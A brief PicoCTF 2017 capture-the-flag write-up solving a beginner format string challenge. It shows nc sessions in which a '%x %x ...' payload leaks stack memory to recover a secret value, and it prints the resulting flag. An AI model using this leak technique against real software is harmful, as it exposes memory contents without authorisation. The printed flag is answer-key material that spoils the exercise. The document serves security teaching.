# PicoCTF_2017: I've got a Secret

**Category:** Binary Exploitation
**Points:** 75
**Description:**

>Hopefully you can find the right format for my [secret](secret.c)! Source. Connect on shell2017.picoctf.com:55189.

**Hint:**

>This is a beginning format string attack.

## Write-up
A classic format string attack.

    $ nc shell2017.picoctf.com 55189
    Give me something to say!
    %x %x %x %x %x %x %x %x %x %x
    40 f7fc7c20 8048792 1 ffffdd34 18d28c09 3 f7fc73c4 ffffdca0 0
    Now tell my secret in hex! Secret: 0xf7fc73c4
    As my friend says,"You get nothing! You lose! Good day, Sir!"

    $ nc shell2017.picoctf.com 55189
    Give me something to say!
    %x %x %x %x %x %x %x %x %x %x
    40 f7fc7c20 8048792 1 ffffdd34 18d28c09 3 f7fc73c4 ffffdca0 0
    Now tell my secret in hex! Secret: 0x18d28c09
    a18450ba7aaa8c085c522cdef6ab35ab
    Wow, you got it!

Therefore, the flag is `a18450ba7aaa8c085c522cdef6ab35ab`.
